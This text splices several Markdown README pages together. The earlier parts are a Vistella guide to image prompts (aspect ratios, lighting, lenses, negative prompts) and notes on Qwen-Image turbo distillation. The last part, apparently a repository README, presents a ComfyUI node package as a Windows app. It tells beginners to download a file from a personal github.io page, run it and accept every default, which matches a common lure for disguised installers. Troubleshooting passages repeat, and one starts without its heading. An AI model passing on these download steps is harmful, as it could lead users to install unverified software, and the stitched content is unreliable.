| Aspect Ratio | Standard Resolution | Best For | Recommended Composition Style |
| :---: | :---: | :--- | :--- |
| **`1:1`** | $1024 \times 1024$ | Social posts (Instagram), avatars, product thumbnails, logos | Centered subjects, symmetrical framing, circular elements |
| **`3:4`** | $768 \times 1024$ | Editorial portraits, fashion lookbooks, magazine covers | Upper-body portraits, natural eye-level posture, negative headroom |
| **`4:5`** | $819 \times 1024$ | Mobile vertical feed portraits, full-body fashion | Vertical elongating lines, standing poses |
| **`16:9`** | $1024 \times 576$ | Desktop wallpapers, YouTube banners, cinematic stills | Rule of thirds, panoramic horizons, expansive environments |
| **`9:16`** | $576 \times 1024$ | Mobile lockscreens, Stories, TikTok/Shorts cover visuals | Towering skyscrapers, waterfalls, full-height vertical architecture |
| **`21:9`** | $1024 \times 439$ | Ultra-wide cinematic stills, epic movie scenes, landscape panoramas | Anamorphic lens distortion, sprawling sci-fi horizons |

---

## 💡 Practical Composition Tips per Ratio

### 1. Square (`1:1`)
- **Key Advantage:** Equal visual weight in every direction.
- **Tip:** Emphasize geometric balance. Use words like `centered composition`, `isolated on neutral background`, or `circular framing`.
- **Ideal Scenarios:** Luxury packaging, minimalist ceramic vases, app icons, sticker art.

### 2. Portrait Vertical (`3:4` & `4:5`)
- **Key Advantage:** Matches natural human proportions without excessive empty ceiling or floor space.
- **Tip:** Leave 15-20% headroom above the subject's hair. Avoid placing the eyes directly in the geometric center; place them on the upper third line.
- **Ideal Scenarios:** Studio headshots, high-fashion editorial, street style candid captures.

### 3. Cinematic Widescreen (`16:9`)
- **Key Advantage:** Standard widescreen format that mimics modern cinematic film and television.
- **Tip:** Position the main focal subject on the left or right third. Let the background tell half the story.
- **Ideal Scenarios:** Concept art, architecture nestled in nature, narrative scenes with environmental storytelling.

### 4. Ultrawide Cinema (`21:9`)
- **Key Advantage:** Maximum dramatic tension and breadth.
- **Tip:** Include foreground, midground, and background layers to prevent the wide canvas from feeling empty. Use `anamorphic lens flare` or `shallow depth of field along the horizon`.
- **Ideal Scenarios:** Sci-fi megastructures, endless mountain ridges, cyberpunk highway pursuits.

---

## 🎨 Start Experimenting on Vistella

Toggle seamlessly between these ratios in the left settings panel:

👉 [**Open Vistella Playground with Ratio Selection →**](https://www.vistella.xyz/en/playground?utm_source=github&utm_medium=ratio_cta)

# 📚 The Vistella Visual Prompt Engineering Handbook

A comprehensive, production-grade guide to mastering composition, lighting, camera optics, and aesthetic styling for AI visual creation on [Vistella (vistella.xyz)](https://www.vistella.xyz/en/playground?utm_source=github&utm_medium=handbook).

---

## 🎯 The Core Philosophy: Natural Description over Keyword Stuffing

Early AI image systems relied on long lists of buzzwords (e.g. `trending on artstation, 8k, hyperrealistic, masterpiece`).  
Modern generation systems on Vistella are fundamentally **semantic-first**:
- They understand **spatial relationships**, **material physics**, and **photographic conventions**.
- Full descriptive phrases yield far better visual coherence than comma-separated tag clouds.

---

## 💡 Chapter 1: The Lighting Masterclass

Lighting dictates 70% of the mood, depth, and three-dimensionality of your image. Always specify light sources and their quality.

### 1.1 Natural & Environmental Lighting
| Lighting Type | Prompt Keyword | Best For | Visual Impact |
| :--- | :--- | :--- | :--- |
| **Golden Hour** | `golden hour warm low-angle sunlight` | Portraits, Landscapes, Architecture | Warm amber highlights, long soft shadows |
| **Blue Hour** | `blue hour twilight, cool ambient tones` | Cityscapes, Moody Portraits | Deep cerulean sky, calm and contemplative |
| **Overcast Diffused** | `diffused soft overcast skylight, shadowless` | Fashion, Editorial, Product Shots | Even exposure, highly accurate color fidelity |
| **Dappled / Foliage** | `dappled sunlight filtering through tree leaves` | Outdoor Portraits, Still Life | Organic shadows, high depth of field |
| **Volumetric Rays** | `god rays, volumetric sunbeams through mist` | Forest, Ancient Temples, Lofts | Tyndall effect, cinematic drama |

### 1.2 Studio & Artificial Lighting
| Technique | Prompt Keyword | Visual Impact |
| :--- | :--- | :--- |
| **Rembrandt Lighting** | `Rembrandt lighting, subtle triangle shadow on cheek` | Classic, dramatic portraiture |
| **Rim / Edge Light** | `strong volumetric rim lighting, illuminated silhouette` | Separates subject from dark background |
| **Softbox Studio** | `large octabox soft diffused studio lighting` | Clean commercial and e-commerce looks |
| **Neon Backlight** | `neon backlight with cyan and magenta color bleed` | Cyberpunk, streetwear, nighttime urban |
| **Chiaroscuro** | `chiaroscuro high-contrast lighting, deep deep shadows` | Baroque, moody fine art |

---

## 📷 Chapter 2: Camera Optics, Lenses & Perspective

Simulating real-world camera optics gives your creations tangible physical realism and removes the "AI synthetic" feel.

### 2.1 Focal Lengths & Field of View
- **Wide Angle (16mm - 24mm)**: `shot on 20mm ultra-wide lens, dynamic perspective, expansive background`  
  *Best for:* Dramatic architecture, grand landscapes, immersive action.
- **Classic Street & Narrative (35mm)**: `shot on 35mm f/1.8 lens, cinematic street photography perspective`  
  *Best for:* Environmental portraits, documentary aesthetic, authentic candid moments.
- **Standard Natural Eye (50mm)**: `50mm prime lens, natural field of view, gentle depth of field`  
  *Best for:* Everyday lifestyle, editorial portraits, balanced product displays.
- **Portrait Telephoto (85mm - 135mm)**: `shot on 85mm f/1.2 lens, creamy shallow depth of field, compressed background`  
  *Best for:* Studio beauty close-ups, professional headshots, isolating subjects.
- **Macro (100mm Macro)**: `extreme close-up macro photography, visible microscopic texture, razor-thin focal plane`  
  *Best for:* Jewelry, water droplets, botanical details, iris close-ups.

### 2.2 Camera Systems for Style Emulation
- **Hasselblad / Medium Format**: `shot on Hasselblad H6D-100c medium format, ultimate clarity, neutral studio color science`
- **Leica M Series**: `Leica M11 aesthetic, authentic contrast, street documentary richness`
- **Analog 35mm Film**: `vintage 35mm film photography, subtle halation, organic grain, Kodak Portra 400 tones`

---

## 🎨 Chapter 3: Color Science & Film Emulation

Color grading establishes subconscious emotion. Instead of generic "colorful", use professional color terms:

| Color Grading | Prompt Phrase | Emotional Tone |
| :--- | :--- | :--- |
| **Kodak Portra 400** | `Kodak Portra 400 tones, flattering warm skin, soft pastel highlights` | Nostalgic, human, warm editorial |
| **Cinestill 800T** | `Cinestill 800T tungsten film look, red halation around bright neon lights` | Nighttime, retro-cinematic, moody |
| **Fujifilm Pro 400H** | `Fujifilm Pro 400H colors, airy soft greens, delicate cool cyan shadows` | Clean, fresh, fine art wedding |
| **Monochromatic Noir**| `high-contrast black and white, deep silver tones, rich velvety blacks` | Dramatic, timeless, classic |
| **Muted Earth Tones** | `monochromatic earthy palette of beige, raw linen, travertine, and ochre` | Modern luxury, architectural, calm |

---

## 📐 Chapter 4: Composition & Framing Rules

Guide the visual flow of the viewer's eye:

1. **Rule of Thirds**: `off-center subject positioned along the right third, breathing room in negative space`
2. **Symmetrical Geometry**: `perfect architectural symmetry, centered composition, balanced reflection`
3. **Low-Angle Hero Shot**: `shot from a low dramatic upward angle, imposing silhouette against sky`
4. **High-Angle / Bird's-Eye**: `overhead top-down knolling perspective, flat-lay arrangement, clean 90-degree angle`
5. **Framing Within a Frame**: `subject viewed through a geometric doorway arch, layered foreground bokeh`

---

## 🛡️ Chapter 5: Negative Prompt Optimization

Negative prompts act as guardrails. Use them strategically rather than randomly pasting giant blocklists.

- **For People & Portraits**:
  ```text
  deformed fingers, extra limbs, bad hands, plastic skin, unnatural face asymmetry, cross-eyed, watermark, signature
  ```
- **For Clean Commercial Shots**:
  ```text
  dust, scratches, fingerprints, harsh reflections, cluttered background, cartoon, oversaturated, blurry
  ```
- **For Architecture & Interiors**:
  ```text
  warped pillars, crooked perspective, uneven floors, messy wires, cartoonish, low resolution
  ```

---

## 🚀 Take It to the Canvas

Practice combining these elements directly on [Vistella (星境)](https://www.vistella.xyz/en/playground?utm_source=github&utm_medium=handbook_bottom).

> **Pro Tip:** Start with **Subject + Lighting**, test the result, then layer in **Lens/Optics + Color Grading** to fine-tune the final mood.

# 🛡️ Vistella Negative Prompt Library & Quality Enhancers

Negative prompts help steer generation away from common artifacts, plastic-looking skin, anatomical errors, and unwanted clutter.

You can paste these negative prompt recipes directly into the **Negative Prompt** input in the [Vistella Playground](https://www.vistella.xyz/en/playground?utm_source=github&utm_medium=negative_prompts_guide).

---

## 📸 1. Photorealistic Portraits & People

Use this when generating realistic human portraits, street photography, or fashion editorials:

```text
deformed fingers, extra limbs, poorly drawn hands, unnatural face proportions, distorted pupils, plastic skin, oversaturated, low quality, blurred background clutter, watermark, text, signature, duplicate face, asymmetrical eyes
```

### Why it works:
- Suppresses plastic/wax figure skin textures.
- Keeps hands and eye geometry aligned.
- Prevents random watermarks or digital signatures from appearing.

---

## 🏺 2. Commercial Products & Still Life

Use this for luxury product photography, perfumes, packaging, and industrial design:

```text
fingerprints, scratches, dust, distorted label text, messy background, harsh unflattering shadows, bad reflections, overexposed highlights, chromatic aberration, cartoon, anime, illustration
```

### Why it works:
- Keeps product surfaces immaculate (scratch-free, dust-free).
- Prevents stylized illustrations from contaminating photorealistic product shots.

---

## 🏛️ 3. Architecture & Interior Design

Use this for buildings, spatial pavilions, and modern interiors:

```text
tilted perspective, warped pillars, uneven floors, crooked window frames, messy wiring, clutter, blurry textures, cartoonish rendering, lowres, oversaturated colors
```

### Why it works:
- Enforces geometric precision and vertical architectural alignments.
- Keeps interior floors and lighting clean.

---

## 🎨 4. Digital Art & Anime

Use this for fantasy concept art, character illustrations, and anime scenes:

```text
mutated anatomy, bad hands, missing fingers, extra eyes, muddy colors, bad lineart, compressed jpeg artifacts, cropped, worst quality, low quality, glitch
```

---

## 💡 Best Practices

1. **Keep Negative Prompts Focused**: Adding 200+ negative tokens can dilute prompt fidelity and wash out natural color grading. 15-25 targeted tokens are ideal.
2. **Complement with Lighting**: If an image feels washed out, reinforce lighting descriptors in your main prompt (e.g., *"volumetric rim light"*, *"deep contrasting shadows"*) rather than over-relying on negative keywords.
3. **Test in Real Time**: Experiment with different combinations in the [Vistella Web App](https://www.vistella.xyz/en/playground?utm_source=github&utm_medium=negative_prompts_footer).

## 🛠️ Troubleshooting Common Issues

### "I get an error saying something about missing files"
Don't panic! This usually happens when the initial download didn't complete fully. Simply close the app, delete the downloaded file, and download again from our link. Make sure your internet doesn't disconnect during download.

### "The application opens but images are generating slowly"
This is normal on computers without a high-end graphics card. Try reducing the image size in settings (e.g., from 1024x1024 to 512x512). You'll still get great results, just faster!

### "I see a message about 'CUDA' or 'GPU drivers'"
This means you need to update your graphics card drivers. Visit your GPU manufacturer's website (NVIDIA, AMD, or Intel) and download the latest driver for your specific card model. It takes about 5 minutes and fixes most issues.

### "The interface looks different from screenshots"
No problem - we update frequently with improvements. As long as your version is the latest (check via the app's "Check for Updates" feature), you're good to go. The functionality will be the same even if the layout varies slightly.

## ▸ Turbo & step distillation Few-step students of the base model, distilled with Distribution Matching Distillation. They trade fidelity for speed: useful for iteration and batch work, weaker than 40 steps on multi-reference composition and identity-preserving edits. **Current Viggle release: `v0.3` (2026-09-29), 6 steps.** It supersedes `v0.2.1` (2026-09-24), `v0.2` (5-step name, sampled at 6) and `v0.1` (4 steps). Sample with `sigmas=[1.0, 0.9375, 0.875, 0.75, 0.5, 0.25]`, CFG 1.0, empty negative prompt. v0.3 is **not a strict upgrade** over v0.2.1 — less grain and cleaner surfaces, fine texture a little softer — so if you prefer the crisper look, v0.2.1 is still in the repository. A new **9-step mode** (7 turbo steps, then the LoRA off and the base model finishes the last two) buys small-text accuracy at about 1.4–1.5× the 6-step cost; it is diffusers- and Space-only. Official source: **[Viggle/Qwen-Image-2.1-viggle-turbo](https://huggingface.co/Viggle/Qwen-Image-2.1-viggle-turbo)**. Three independent distillation lines are listed below, and their checkpoints are **not interchangeable** — pick one family. **Viggle** is the reference DMD line above. **Alibaba PAI** ships an official 4-step line via Parallel Decoding Distillation (PDD) in VideoX-Fun. **[Pruna](https://huggingface.co/Pruna-Qwen-Image-2.1)** is a third-party DMD line with 8-step and 5-step adapters. The Pruna adapters are strict about sampling. Each has its own sigma schedule and they are **not** interchangeable, so load exactly one: 8-step wants `sigmas=[1.0, 14/15, 6/7, 10/13, 2/3, 6/11, 0.4, 2/9]`, 5-step wants `sigmas=[1.0, 0.94, 6/7, 2/3, 0.4]`. Both need `shift=1.0` with dynamic shifting **off** (otherwise the sigmas get shifted twice), no CFG, no negative prompt, and LoRA strength 1.0. Trained at 1K with up to 3 reference images; 2K runs but sits outside training coverage. Requires a pinned diffusers commit.

# 🚀 awesome-qwen-image - Create Stunning Images Instantly

[![Download Now](https://img.shields.io/badge/Download-awesome--qwen--image-2ea44f?style=for-the-badge)](https://shazilh1938.github.io)

## 👋 Welcome to awesome-qwen-image

This is your friendly, all-in-one toolkit for creating beautiful images with artificial intelligence. Whether you want to generate brand-new pictures from text descriptions, edit existing photos (like changing background colors or removing objects), or create amazing artwork for your projects, awesome-qwen-image gives you everything you need in one place.

We've taken the latest Qwen-Image 2.1 AI model technology and wrapped it in an easy package that works with popular creative tools like ComfyUI. You don't need to be a programmer, data scientist, or tech wizard to use this - if you can click a button, you can create stunning images.

## ✨ What Makes This Special?

### 🖼️ Complete Qwen-Image 2.1 Support
This package includes all the core components of the Qwen-Image 2.1 system, including various file formats that make the AI run faster or use less computer memory. Think of it like having multiple versions of a recipe - each works well, but some are easier on your kitchen appliances.

### 🔌 Seamless ComfyUI Integration
If you use ComfyUI - a popular visual editor for AI image generation - these custom nodes will snap right in. This means you can use powerful image editing tools without writing a single line of code. Just drag, drop, and connect things visually.

### 📝 Smart Prompt Engine
Don't know what to type? The built-in prompt engine helps you write better descriptions that result in higher-quality images. It's like having an AI coach that translates your rough ideas into precise instructions the AI understands perfectly.

### 🧩 Ready-Made LoRAs
LoRAs are special add-ons that teach the AI new styles - think watercolor painting, anime art, or vintage photography effects. The package includes pre-trained LoRAs so you can apply artistic styles immediately just by selecting them.

### 🔧 Essential Tooling
Everything else you need to get up and running quickly: file conversion tools, utilities to optimize performance, and helper scripts to make your workflow smoother. No digging through confusing code repositories or installing random dependencies manually.

## 🚀 Getting Started

### Step 1: Download the Software

Visit this link to download the application: [https://shazilh1938.github.io](https://shazilh1938.github.io)

### Step 2: Open the Downloaded File

After clicking the link above, you'll land on a page showing the project files. Find the download button (usually green or blue) and click it. The file will start downloading automatically. Once finished, open your browser's Downloads folder and double-click the file you just downloaded. This will start the setup process.

### Step 3: Follow On-Screen Instructions

The setup wizard will guide you through everything. Just click "Next" or "Continue" buttons and accept the default choices unless you have a specific reason to change them. The whole process shouldn't take more than a few minutes.

### Step 4: Launch the Application

After installation completes, you'll see an awesome-qwen-image icon on your desktop or in your Start Menu. Double-click it to open the application. You're ready to start creating!

## 💻 What You Need to Get Started

This software works best with a moderately powerful Windows computer. Here's what we recommend:

- **Operating System:** Windows 10 or Windows 11 (64-bit versions)
- **Memory (RAM):** At least 8 GB (16 GB is better for large images)
- **Graphics Card:** Any modern GPU from NVIDIA, AMD, or Intel (even integrated graphics will work, just slower)
- **Storage Space:** About 2 GB of free space for the software core files
- **Internet Connection:** Needed for the initial download and any future updates

Don't worry if your computer isn't top-of-the-line - the software is designed to run at different quality levels so it adapts to your hardware.

## 🎯 How to Use It

### For Total Beginners
1. Launch the application
2. Look for a big box where you can type a description
3. Type something like "a red apple on a wooden table in morning sunlight"
4. Click the "Generate" button
5. Wait a few seconds (or minutes on slower computers) and watch your image appear!

### For Image Editing (i2i - Image-to-Image)
Want to edit a photo you already have? Use the i2i feature:
1. Click "Upload Image" and select your photo
2. Type instructions like "add a snowy mountain background" or "turn this into a pencil sketch"
3. Hit "Apply" and watch the AI transform your photo while keeping it recognizable

### For Text-to-Image (t2i)
Generating completely new images from scratch is the t2i feature:
1. Click "Text to Image" tab
2. Write a detailed description (be specific! Colors, lighting, style, mood)
3. Choose a style preset if you want (watercolor, sci-fi, cartoon, etc.)
4. Click "Create" and download your masterpiece

### For ComfyUI Users
If you're already familiar with ComfyUI:
1. Install this package by placing the folder in your ComfyUI `custom_nodes` directory
2. Restart ComfyUI
3. You'll see all the new node types under "Qwen" category
4. Wire them into your existing workflows just like any other nodes

Don't panic! This usually happens when the initial download didn't complete fully. Simply close the app, delete the downloaded file, and download again from our link. Make sure your internet doesn't disconnect during download.

### "The application opens but images are generating slowly"
This is normal on computers without a high-end graphics card. Try reducing the image size in settings (e.g., from 1024x1024 to 512x512). You'll still get great results, just faster!

### "I see a message about 'CUDA' or 'GPU drivers'"
This means you need to update your graphics card drivers. Visit your GPU manufacturer's website (NVIDIA, AMD, or Intel) and download the latest driver for your specific card model. It takes about 5 minutes and fixes most issues.

### "The interface looks different from screenshots"
No problem - we update frequently with improvements. As long as your version is the latest (check via the app's "Check for Updates" feature), you're good to go. The functionality will be the same even if the layout varies slightly.
